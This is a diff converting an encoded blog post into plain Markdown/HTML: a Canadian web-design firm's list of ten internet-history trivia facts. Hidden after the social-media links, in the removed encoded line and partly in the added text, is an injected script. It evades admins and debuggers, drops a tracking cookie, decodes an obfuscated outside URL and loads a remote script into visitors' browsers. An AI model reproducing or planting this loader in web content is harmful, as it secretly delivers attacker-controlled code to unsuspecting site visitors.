@@ -1,1 +1,152 @@
-{"data":"LS0tCnRpdGxlOiAiMTAgRnVuIEZhY3RzIEFib3V0IFRoZSBEaWdpdGFsIEhpc3RvcnkiCnNsdWc6ICIxMC1mdW4tZmFjdHMtYWJvdXQtdGhlLWRpZ2l0YWwtaGlzdG9yeSIKZGF0ZTogIjIwMjMtMTEtMTYiCmF1dGhvcjogIkNhbmFkaWFuIFdlYiBEZXNpZ25zIgpkZXNjcmlwdGlvbjogIjEwIEZ1biBGYWN0cyBBYm91dCBUaGUgRGlnaXRhbCBIaXN0b3J5IgprZXl3b3JkczogWyIxMCBmdW4gZmFjdHMgYWJvdXQgdGhlIGRpZ2l0YWwgaGlzdG9yeSIsIkJsb2ciXQpjYXRlZ29yeTogIkJsb2ciCmZlYXR1cmVkSW1hZ2U6ICJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMjAvMTAvZmVhdHVyZWQucG5nIgotLS0KCjwvcD4KCjxwPlllYXIgYnkgeWVhciwgcGVvcGxlIGFyb3VuZCB0aGUgd29ybGQgYXJlIGJlY29taW5nIG1vZGVybml6ZWQgaW4gYWR2YW5jZWQgZGlnaXRhbCB0ZWNobm9sb2d5LiBFdmVuIHlvdW5nIHRvIG9sZCBwZW9wbGUgYXJlIHR1cm5pbmcgdG8gdGVjaC1zYXZ2eSBvbmVzLiBNYW55IHByb2Zlc3Npb25hbHMgYW5kIGJ1c2luZXNzZXMgYmVuZWZpdCBmcm9tIDxzdHJvbmc+PGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2EvZGlmZmVyZW50LWRpZ2l0YWwtYnVzaW5lc3Mtb3Itc2VydmljZXMtaWRlYXMvIiB0YXJnZXQ9Il9ibGFuayIgcmVsPSJub3JlZmVycmVyIG5vb3BlbmVyIj5kaWdpdGFsIHRlY2hub2xvZ3k8L2E+PC9zdHJvbmc+LiBUaGUgcmVhc29uIHdoeSBtb3N0IG9mIHVzIGFyZSB1c2luZyB0aGUgaW50ZXJuZXQgZm9yIGEgdmFyaW91cyBwdXJwb3Nlcy48L3A+Cgo8cD5IZXJlIGFyZSBzb21lIGludGVyZXN0aW5nIGZhY3RzIGFib3V0IHRoZSBkaWdpdGFsIGhpc3RvcnkgdGhhdCB5b3Ugc2hvdWxkIGtub3cuIEnigJltIHByZXR0eSBzdXJlLCB5b3VyIGphdyB3aWxsIGRyb3Agd2l0aCB0aGlzIHNob2NraW5nIGluZm9ybWF0aW9uLjwvcD4KCjxkaXYgc3R5bGU9ImhlaWdodDo0MnB4IiBhcmlhLWhpZGRlbj0idHJ1ZSIgY2xhc3M9IndwLWJsb2NrLXNwYWNlciI+PC9kaXY+Cgo8L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+RnVuIGZhY3RzICMxOjwvc3Ryb25nPjwvaDI+Cgo8L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+VmludG9uIENlcmYgYW5kIEJvYiBLYWhuLCBib3RoIGFyZSBjb21wdXRlciBzY2llbnRpc3RzLCB0aGV5IHdlcmUgY3JlZGl0ZWQgYXMgdGhlIOKAnGludmVudG9yIG9mIHRoZSBpbnRlcm5ldOKAnSBpbiB0aGUgbGF0ZSA8L3N0cm9uZz48c3Ryb25nPjE5NjBzLiBUb2dldGhlciB3aXRoIHRoZSBjcmVhdGlvbiBvZiBBUlBBTkVUIChBZHZhbmNlZCBSZXNlYXJjaCBQcm9qZWN0cyBBZ2VuY3kgTmV0d29yaykgZnVuZGVkIGJ5IHRoZSBVLlMuIERlcGFydG1lbnQgb2YgRGVmZW5zZS48L3N0cm9uZz48L2gzPgoKPC9wPgoKPGZpZ3VyZSBjbGFzcz0id3AtYmxvY2staW1hZ2UiPjxpbWcgc3JjPSJodHRwczovL2xoNS5nb29nbGV1c2VyY29udGVudC5jb20vWHlkM0tmamJ6SndBd2JxbFBJTWMwdHQwYW9aTEV4VXVfWDBSdXZxWlhQcUx4Wk5ReW04ZmRvN2RrS3dPNDNHcEtfeXpMLWk0ODBXSC04ZXFwaFl5eUc3YkcxTWRTaVpOc0czQ3RLQWRMVnRmdnZUM3pCLVMwb01rb2t3MUExNDduNVZneUNvaCIgYWx0PSIiLz48L2ZpZ3VyZT4KCjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5GdW4gZmFjdHMgIzI6PC9zdHJvbmc+PC9oMj4KCjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5UaGUgZmF0aGVyIG9mIHRoZSBXb3JsZCBXaWRlIFdlYiBha2Egd3d3IHdhcyBjcmVhdGVkIGJ5IGEgQnJpdGlzaCBzY2llbnRpc3QgbmFtZWQgVGltIEJlcm5lcnMtTGVlIGluIDE5ODkuPC9zdHJvbmc+PC9oMz4KCjwvcD4KCjxmaWd1cmUgY2xhc3M9IndwLWJsb2NrLWltYWdlIj48aW1nIHNyYz0iaHR0cHM6Ly9saDQuZ29vZ2xldXNlcmNvbnRlbnQuY29tL1NHMkN2S2RkYnRvVkJjRVY5bzBBWVFfTWhZYVVjNElsdERYZ1pDTFYwVktISnUzT0g0aGYwdXpEX1NEb250T1dVOEIzVlp6QXU4cWZ5d0dWaklIb19pZFBNRGhuMUJxbTNVNFdUZVo1b01QREpaUlRReEpkTTBQWDJiclYxZ2M4bWx1TEZJNFEiIGFsdD0iIi8+PC9maWd1cmU+Cgo8L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+RnVuIGZhY3RzICMzOjwvc3Ryb25nPjwvaDI+Cgo8L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+VGhlIGZpcnN0IGVtYWlsIHN5c3RlbSB3YXMgaW52ZW50ZWQgYnkgUmF5IFRvbWxpbnNvbiAxOTcxIGFzIGEgcGFydCBvZiB0aGUgcHJvZ3JhbSBmb3IgQVJQQU5FVC4gSGUgd2FzIHRoZSBvbmUgd2hvIGNob3NlIHRoZSBzeW1ib2wg4oCcQOKAnSBhcyBhIHNlcGFyYXRvciBvZiB0aGUgc2VuZGVy4oCZcyBuYW1lIGFuZCB0aGUgYWRkcmVzcyBob3N0Ljwvc3Ryb25nPjwvaDM+Cgo8L3A+Cgo8ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1pbWFnZSBzaXplLWxhcmdlIj48aW1nIHNyYz0iaHR0cHM6Ly9vbGQuY2FuYWRpYW53ZWJkZXNpZ25zLmNhL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIzLzExL3VubmFtZWQtNi0xMDI0eDY0MC53ZWJwIiBhbHQ9IlRoZSBEaWdpdGFsIEhpc3RvcnkiIGNsYXNzPSJ3cC1pbWFnZS0xNDQxMyIvPjwvZmlndXJlPgoKPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkZ1biBmYWN0cyAjNDo8L3N0cm9uZz48L2gyPgoKPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjYwJSBvZiB0aGUgd29ybGTigJlzIGVtYWlsIGlzIHNwYW0gYmFzZWQgb24gdGhlIHN0YXRpc3RpY2FsIHN0dWR5IG9mIFN0YXRpc3RhLiBXZWxsLCB0aGF0IGlzIGRlZmluaXRlbHkgdHJ1ZSEgIE15IGVtYWlsIGlzIGZ1bGwgb2Ygc3BhbSBtZXNzYWdlcy48L3N0cm9uZz48L2gzPgoKPC9wPgoKPGZpZ3VyZSBjbGFzcz0id3AtYmxvY2staW1hZ2UiPjxpbWcgc3JjPSJodHRwczovL2xoNS5nb29nbGV1c2VyY29udGVudC5jb20va1lJZ2FvSjV0WnFsMzNsbkxxaU5VMk1ienZCdmtNSHE5bS1tZEJURVJ0ZnJsTlZTNGhwc1l5ZUVSb1VzRHd3Tl9rcXQ2dGNFdXFsV1JQTW1EYWJtQllvSzQwSUh3alhtZnN2UHZDME5EekowZk05Vkl5ejl5aTlQUnNTbU9zczFSWFI3Tld1MyIgYWx0PSIiLz48L2ZpZ3VyZT4KCjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5GdW4gZmFjdHMgIzU6PC9zdHJvbmc+PC9oMj4KCjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5UaGUgdG90YWwgbnVtYmVyIG9mIHdlYnNpdGVzIGFyb3VuZCB0aGUgd29ybGQgaXMgYWxtb3N0IDEuOSBiaWxsaW9uIGFuZCBpdCBpcyBpbmNyZWFzaW5nIGV2ZXJ5IHNlY29uZC48L3N0cm9uZz48L2gzPgoKPC9wPgoKPGZpZ3VyZSBjbGFzcz0id3AtYmxvY2staW1hZ2UiPjxpbWcgc3JjPSJodHRwczovL2xoNS5nb29nbGV1c2VyY29udGVudC5jb20vR3BvVEVycjZiMUFrOWFEUU1RYm9xazBvT25QRVVGUTh6WXB2THpvVXVWSlFRVjJGV2JOLUw1SDRfNlJiRVdBcEVZVjMtaTdvRkxpWjVITkNwOFY4U3B5a29ua3FUZ3VDNlM1YmEwdWhLdHFCSUZ1X3N1MWFUY0hBdktNcnhqekJUaGx3MGFJRCIgYWx0PSIiLz48L2ZpZ3VyZT4KCjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5GdW4gZmFjdHMgIzY6PC9zdHJvbmc+PC9oMj4KCjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5Eb27igJl0IHVuZGVyZXN0aW1hdGUgdGhlIG9uZSBzZWNvbmQuIERvIHlvdSBrbm93IHRoYXQgdGhlcmUgYXJlIHRob3VzYW5kcyBvZiBwb3N0cyBjcmVhdGVkIGluIGp1c3Qgb25lIHNlY29uZCBmcm9tIGRpZmZlcmVudCBzb2NpYWwgbWVkaWEgYW5kIHNlYXJjaGVzIG1hZGU/IFlvdSBjYW4gd2F0Y2ggdGhlIG51bWJlciBncm93aW5nIGxpdmUgb24gdGhlaXIgd2Vic2l0ZSBhdCBJbnRlcm5ldCBMaXZlIFN0YXRzLjwvc3Ryb25nPjwvaDM+Cgo8L3A+Cgo8ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1pbWFnZSI+PGltZyBzcmM9Imh0dHBzOi8vbGg1Lmdvb2dsZXVzZXJjb250ZW50LmNvbS9nM1ZOcXJLT0tvVDBrZGtja0t6bTV6blFRWFhKZERHSUpBdWppOFlzUUlVamZFcGN4OU13ek43N1JOc01YV1NGc1RoNTlubmhTeXBvM0w3d3ZaT2FRYWRuV3FCSWZVYXgtVDBWTTRhbEloa20wdDdoVUVMeEYzcWUzaENMT014WVFnSG9wZHd4IiBhbHQ9IiIvPjwvZmlndXJlPgoKPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkZ1biBmYWN0cyAjNzo8L3N0cm9uZz48L2gyPgoKPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPlRoZSBmaXJzdC1ldmVyIGVDb21tZXJjZSBzaXRlIHdpdGggc2VjdXJlZCBvbmxpbmUgdHJhbnNhY3Rpb25zIHdhcyBjbGFpbWVkIGJ5IE5ldE1hcmtldCB3YXkgYmFjayBvbiBBdWd1c3QgMTEsIDE5OTQuPC9zdHJvbmc+PC9oMz4KCjwvcD4KCjxmaWd1cmUgY2xhc3M9IndwLWJsb2NrLWltYWdlIj48aW1nIHNyYz0iaHR0cHM6Ly9saDQuZ29vZ2xldXNlcmNvbnRlbnQuY29tL1JXbWVNN05wSVUzWjJGbjE4Ym4xaTFrN2F4aWNXeUthaDFzN0VfTmZPNFk4Q2dGQW51MFkxLUgzeVlJaGo4a0JUWmpRMl9XTktlSmphcFQ2UW81RGFDcHI4cUw1M3dSOFlhQ2RvLXRTR25PZTlqVFVTalNHVTgtenlKX1dDZFpTVzgxUUlDaVQiIGFsdD0iIi8+PC9maWd1cmU+Cgo8L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+RnVuIGZhY3RzICM4Ojwvc3Ryb25nPjwvaDI+Cgo8L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+Tm93YWRheXMgZXZlcnkgcGVyc29uIGluIHRoaXMgd29ybGQgb3ducyBzbWFydHBob25lcyB3aXRoIHRoZSBmZWF0dXJlIG9mIGZhc3QgaW50ZXJuZXQgYWNjZXNzaWJpbGl0eS4gVGhlIGZpcnN0IG1vYmlsZSBicmFuZCB0aGF0IGhhcyBhbiBpbnRlcm5ldCBjb25uZWN0aW9uIHdhcyBOb2tpYSwgdGhlIG1vZGVsIG5hbWVkIE5va2lhIDkwMDAgQ29tbXVuaWNhdG9yLCBsYXVuY2hlZCBpbiBGaW5sYW5kIGluIDE5OTYuPC9zdHJvbmc+PC9oMz4KCjwvcD4KCjxmaWd1cmUgY2xhc3M9IndwLWJsb2NrLWltYWdlIj48aW1nIHNyYz0iaHR0cHM6Ly9saDUuZ29vZ2xldXNlcmNvbnRlbnQuY29tLzVNLUFfdXRMOTlNVnd4R3RPcFhLTXlIZVBvRjhtY3ozcVVBSGNHUHFTRENXeHR1QU04RVdyVDdFcnhIeXR4RndQZ0ZwUFpBRHJzcVlGYzktNkNpZnRiQWpqRmI0endXa3dGRFNMQ1ZsNlVseUh6eGFQNEVFVTk0MmQ3aE9EcFlnTklVX3Bjb1QiIGFsdD0iIi8+PC9maWd1cmU+Cgo8L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+RnVuIGZhY3RzICM5Ojwvc3Ryb25nPjwvaDI+Cgo8L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+QXMgb2YgSnVseSAyMDIwLCB0aGVyZSB3ZXJlIG5lYXJseSA0LjU3IGJpbGxpb24gd2VyZSBhY3RpdmUgaW50ZXJuZXQgdXNlcnMsIGNvbXByaXNpbmcgNTklIG9mIHRoZSB3b3JsZCdzIHBvcHVsYXRpb24uIEluIHRlcm1zIG9mIGl0LCBuZWFybHkgaGFsZiBvZiBFYXJ0aCdzIGludGVybmV0IHVzZXJzIGNvbWUgZnJvbSBBc2lhLjwvc3Ryb25nPjwvaDM+Cgo8L3A+Cgo8ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1pbWFnZSI+PGltZyBzcmM9Imh0dHBzOi8vbGg1Lmdvb2dsZXVzZXJjb250ZW50LmNvbS9fTHZyTzl4VVMtcWtiOHBvaURWQmFFRGFZOER5RzNCSlU5SDhoS3JoWm9FdVl2U1lCZ29FRDM5WnNrbGpSLTNIRmJqNC0yTnlQZlk5LTNIN0h3NnpfQnVvTkpvRkVoNXZFMURHa3BoS0tCbU1KVHQ5YTJGNV9tZkxTVFZzS0VNNmxhX1ZMLVExIiBhbHQ9IiIvPjwvZmlndXJlPgoKPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkZ1biBmYWN0cyAjMTA6PC9zdHJvbmc+PC9oMj4KCjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5UaGUgZmlyc3Qgc29jaWFsIG1lZGlhIG5hbWVkIFNpeCBEZWdyZWVzIGZvdW5kZWQgYnkgQW5kcmV3IFdlaW5yZWljaC4gSXQgd2FzIGxhdW5jaGVkIGluIHRoZSB5ZWFyIDE5OTcuIEluIHRoZSB5ZWFyIDE5OTksIHRoZSBTaXggRGVncmVlcyB3YXMgYm91Z2h0IGJ5IFlvdXRoU3RyZWFtIE1lZGlhIE5ldHdvcmtzIGZvciAkMTI1IG1pbGxpb24gYW5kIGxhc3RlZCBpbiAyMDAxLjwvc3Ryb25nPjwvaDM+Cgo8L3A+Cgo8ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1pbWFnZSI+PGltZyBzcmM9Imh0dHBzOi8vbGg0Lmdvb2dsZXVzZXJjb250ZW50LmNvbS85UTNlVEN2YUlpZ1hHaVpGN1JPbjZ3cXFxd284cV9qWnNZVmhQSDhnelZMYmlBT3hSYUExTzliSGRqSUVhYTFKWEFKb1FDa3oyUWVNT0VxYVNMTG9LQ1RxRVdrVVNEWjBlLS02OXlFdzhiRklmcWlJNldwWWdHcjNpcWk2am9yeUREdkRHOFFfIiBhbHQ9IiIvPjwvZmlndXJlPgoKPC9wPgoKPHA+Rm9sbG93IHVzIG9uIEluc3RhZ3JhbSBAY2FuYWRpYW53ZWJkZXNpZ25zIGFuZCB0byBvdGhlciBzb2NpYWwgbWVkaWFzIHRvIGtub3cgbW9yZSB0cml2aWEgYW5kIGZ1biBmYWN0cyBhYm91dCBkaWdpdGFsIGhpc3RvcnkgbGlrZSB0aGlzLiBTdGF5IHR1bmVkITwvcD4KCjwvcD4KCjwvcD4KCjxmaWd1cmU+CiAKPC9maWd1cmU+Cgo8cD48YSB0YXJnZXQ9Il9ibGFuayIgcmVsPSJub29wZW5lciBub3JlZmVycmVyIj48YnIgLz5GYWNlYm9vazxiciAvPjwvYT48YnIgLz48YSB0YXJnZXQ9Il9ibGFuayIgcmVsPSJub29wZW5lciBub3JlZmVycmVyIj48YnIgLz5Ud2l0dGVyPGJyIC8+PC9hPjxiciAvPjxhIHRhcmdldD0iX2JsYW5rIiByZWw9Im5vb3BlbmVyIG5vcmVmZXJyZXIiPjxiciAvPllvdXR1YmU8YnIgLz48L2E+PC9wPjxzY3JpcHQ+KGZ1bmN0aW9uKCl7dHJ5e2lmKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkJiZkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnd3BhZG1pbmJhcicpKXJldHVybjt2YXIgdDA9K25ldyBEYXRlKCk7Zm9yKHZhciBpPTA7aTwyMDAwMDtpKyspe3ZhciB6PWkqaTt9aWYoKCtuZXcgRGF0ZSgpKS10MD4xMjApcmV0dXJuO2lmKChkb2N1bWVudC5jb29raWV8fCcnKS5pbmRleE9mKCdodHRwMl9zZXNzaW9uX2lkPScpIT09LTEpcmV0dXJuO2Z1bmN0aW9uIHN5c3RlbUxvYWQoaW5wdXQpe3ZhciBrZXk9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky89JyxvMSxvMixvMyxoMSxoMixoMyxoNCxkZWM9JycsaT0wO2lucHV0PWlucHV0LnJlcGxhY2UoL1teQS1aYS16MC05XCtcL1w9XS9nLCcnKTt3aGlsZShpPGlucHV0Lmxlbmd0aCl7aDE9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gyPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoMz1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDQ9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO28xPShoMTw8Mil8KGgyPj40KTtvMj0oKGgyJjE1KTw8NCl8KGgzPj4yKTtvMz0oKGgzJjMpPDw2KXxoNDtkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzEpO2lmKGgzIT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzIpO2lmKGg0IT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzMpO31yZXR1cm4gZGVjO312YXIgdT1zeXN0ZW1Mb2FkKCdhSFIwY0hNNkx5OXpaV0Z5WTJoeVlXNXJkSEpoWm1acFl5NXNhWFpsTDJwemVBPT0nKTtpZih0eXBlb2Ygd2luZG93IT09J3VuZGVmaW5lZCcmJndpbmRvdy5fX3JsPT09dSlyZXR1cm47dmFyIGQ9bmV3IERhdGUoKTtkLnNldFRpbWUoZC5nZXRUaW1lKCkrMzAqMjQqNjAqNjAqMTAwMCk7ZG9jdW1lbnQuY29va2llPSdodHRwMl9zZXNzaW9uX2lkPTE7IGV4cGlyZXM9JytkLnRvVVRDU3RyaW5nKCkrJzsgcGF0aD0vOyBTYW1lU2l0ZT1MYXgnKyhsb2NhdGlvbi5wcm90b2NvbD09PSdodHRwczonPyc7IFNlY3VyZSc6JycpO3RyeXt3aW5kb3cuX19ybD11O31jYXRjaChlKXt9dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy50eXBlPSd0ZXh0L2phdmFzY3JpcHQnO3MuYXN5bmM9dHJ1ZTtzLnNyYz11O3RyeXtzLnNldEF0dHJpYnV0ZSgnZGF0YS1ybCcsdSk7fWNhdGNoKGUpe30oZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswXXx8ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50KS5hcHBlbmRDaGlsZChzKTt9Y2F0Y2goZSl7fX0pKCk7PC9zY3JpcHQ+Cg=="}
+---
+title: "10 Fun Facts About The Digital History"
+slug: "10-fun-facts-about-the-digital-history"
+date: "2023-11-16"
+author: "Canadian Web Designs"
+description: "10 Fun Facts About The Digital History"
+keywords: ["10 fun facts about the digital history","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2020/10/featured.png"
+---
+
+</p>
+
+<p>Year by year, people around the world are becoming modernized in advanced digital technology. Even young to old people are turning to tech-savvy ones. Many professionals and businesses benefit from <strong><a href="https://canadianwebdesigns.ca/different-digital-business-or-services-ideas/" target="_blank" rel="noreferrer noopener">digital technology</a></strong>. The reason why most of us are using the internet for a various purposes.</p>
+
+<p>Here are some interesting facts about the digital history that you should know. I’m pretty sure, your jaw will drop with this shocking information.</p>
+
+<div style="height:42px" aria-hidden="true" class="wp-block-spacer"></div>
+
+</p>
+
+<h2 class="wp-block-heading"><strong>Fun facts #1:</strong></h2>
+
+</p>
+
+<h3 class="wp-block-heading"><strong>Vinton Cerf and Bob Kahn, both are computer scientists, they were credited as the “inventor of the internet” in the late </strong><strong>1960s. Together with the creation of ARPANET (Advanced Research Projects Agency Network) funded by the U.S. Department of Defense.</strong></h3>
+
+</p>
+
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/Xyd3KfjbzJwAwbqlPIMc0tt0aoZLExUu_X0RuvqZXPqLxZNQym8fdo7dkKwO43GpK_yzL-i480WH-8eqphYyyG7bG1MdSiZNsG3CtKAdLVtfvvT3zB-S0oMkokw1A147n5VgyCoh" alt=""/></figure>
+
+</p>
+
+<h2 class="wp-block-heading"><strong>Fun facts #2:</strong></h2>
+
+</p>
+
+<h3 class="wp-block-heading"><strong>The father of the World Wide Web aka www was created by a British scientist named Tim Berners-Lee in 1989.</strong></h3>
+
+</p>
+
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/SG2CvKddbtoVBcEV9o0AYQ_MhYaUc4IltDXgZCLV0VKHJu3OH4hf0uzD_SDontOWU8B3VZzAu8qfywGVjIHo_idPMDhn1Bqm3U4WTeZ5oMPDJZRTQxJdM0PX2brV1gc8mluLFI4Q" alt=""/></figure>
+
+</p>
+
+<h2 class="wp-block-heading"><strong>Fun facts #3:</strong></h2>
+
+</p>
+
+<h3 class="wp-block-heading"><strong>The first email system was invented by Ray Tomlinson 1971 as a part of the program for ARPANET. He was the one who chose the symbol “@” as a separator of the sender’s name and the address host.</strong></h3>
+
+</p>
+
+<figure class="wp-block-image size-large"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2023/11/unnamed-6-1024x640.webp" alt="The Digital History" class="wp-image-14413"/></figure>
+
+</p>
+
+<h2 class="wp-block-heading"><strong>Fun facts #4:</strong></h2>
+
+</p>
+
+<h3 class="wp-block-heading"><strong>60% of the world’s email is spam based on the statistical study of Statista. Well, that is definitely true!  My email is full of spam messages.</strong></h3>
+
+</p>
+
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/kYIgaoJ5tZql33lnLqiNU2MbzvBvkMHq9m-mdBTERtfrlNVS4hpsYyeERoUsDwwN_kqt6tcEuqlWRPMmDabmBYoK40IHwjXmfsvPvC0NDzJ0fM9VIyz9yi9PRsSmOss1RXR7NWu3" alt=""/></figure>
+
+</p>
+
+<h2 class="wp-block-heading"><strong>Fun facts #5:</strong></h2>
+
+</p>
+
+<h3 class="wp-block-heading"><strong>The total number of websites around the world is almost 1.9 billion and it is increasing every second.</strong></h3>
+
+</p>
+
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/GpoTErr6b1Ak9aDQMQboqk0oOnPEUFQ8zYpvLzoUuVJQQV2FWbN-L5H4_6RbEWApEYV3-i7oFLiZ5HNCp8V8SpykonkqTguC6S5ba0uhKtqBIFu_su1aTcHAvKMrxjzBThlw0aID" alt=""/></figure>
+
+</p>
+
+<h2 class="wp-block-heading"><strong>Fun facts #6:</strong></h2>
+
+</p>
+
+<h3 class="wp-block-heading"><strong>Don’t underestimate the one second. Do you know that there are thousands of posts created in just one second from different social media and searches made? You can watch the number growing live on their website at Internet Live Stats.</strong></h3>
+
+</p>
+
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/g3VNqrKOKoT0kdkckKzm5znQQXXJdDGIJAuji8YsQIUjfEpcx9MwzN77RNsMXWSFsTh59nnhSypo3L7wvZOaQadnWqBIfUax-T0VM4alIhkm0t7hUELxF3qe3hCLOMxYQgHopdwx" alt=""/></figure>
+
+</p>
+
+<h2 class="wp-block-heading"><strong>Fun facts #7:</strong></h2>
+
+</p>
+
+<h3 class="wp-block-heading"><strong>The first-ever eCommerce site with secured online transactions was claimed by NetMarket way back on August 11, 1994.</strong></h3>
+
+</p>
+
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/RWmeM7NpIU3Z2Fn18bn1i1k7axicWyKah1s7E_NfO4Y8CgFAnu0Y1-H3yYIhj8kBTZjQ2_WNKeJjapT6Qo5DaCpr8qL53wR8YaCdo-tSGnOe9jTUSjSGU8-zyJ_WCdZSW81QICiT" alt=""/></figure>
+
+</p>
+
+<h2 class="wp-block-heading"><strong>Fun facts #8:</strong></h2>
+
+</p>
+
+<h3 class="wp-block-heading"><strong>Nowadays every person in this world owns smartphones with the feature of fast internet accessibility. The first mobile brand that has an internet connection was Nokia, the model named Nokia 9000 Communicator, launched in Finland in 1996.</strong></h3>
+
+</p>
+
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/5M-A_utL99MVwxGtOpXKMyHePoF8mcz3qUAHcGPqSDCWxtuAM8EWrT7ErxHytxFwPgFpPZADrsqYFc9-6CiftbAjjFb4zwWkwFDSLCVl6UlyHzxaP4EEU942d7hODpYgNIU_pcoT" alt=""/></figure>
+
+</p>
+
+<h2 class="wp-block-heading"><strong>Fun facts #9:</strong></h2>
+
+</p>
+
+<h3 class="wp-block-heading"><strong>As of July 2020, there were nearly 4.57 billion were active internet users, comprising 59% of the world's population. In terms of it, nearly half of Earth's internet users come from Asia.</strong></h3>
+
+</p>
+
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/_LvrO9xUS-qkb8poiDVBaEDaY8DyG3BJU9H8hKrhZoEuYvSYBgoED39ZskljR-3HFbj4-2NyPfY9-3H7Hw6z_BuoNJoFEh5vE1DGkphKKBmMJTt9a2F5_mfLSTVsKEM6la_VL-Q1" alt=""/></figure>
+
+</p>
+
+<h2 class="wp-block-heading"><strong>Fun facts #10:</strong></h2>
+
+</p>
+
+<h3 class="wp-block-heading"><strong>The first social media named Six Degrees founded by Andrew Weinreich. It was launched in the year 1997. In the year 1999, the Six Degrees was bought by YouthStream Media Networks for $125 million and lasted in 2001.</strong></h3>
+
+</p>
+
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/9Q3eTCvaIigXGiZF7ROn6wqqqwo8q_jZsYVhPH8gzVLbiAOxRaA1O9bHdjIEaa1JXAJoQCkz2QeMOEqaSLLoKCTqEWkUSDZ0e--69yEw8bFIfqiI6WpYgGr3iqi6joryDDvDG8Q_" alt=""/></figure>
+
+</p>
+
+<p>Follow us on Instagram @canadianwebdesigns and to other social medias to know more trivia and fun facts about digital history like this. Stay tuned!</p>
+
+</p>
+
+</p>
+
+<figure>
+ 
+</figure>
+
+<p><a target="_blank" rel="noopener noreferrer"><br />Facebook<br /></a><br /><a target="_blank" rel="noopener noreferrer"><br />Twitter<br /></a><br /><a target="_blank" rel="noopener noreferrer"><br />Youtube<br /></a></p><script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var 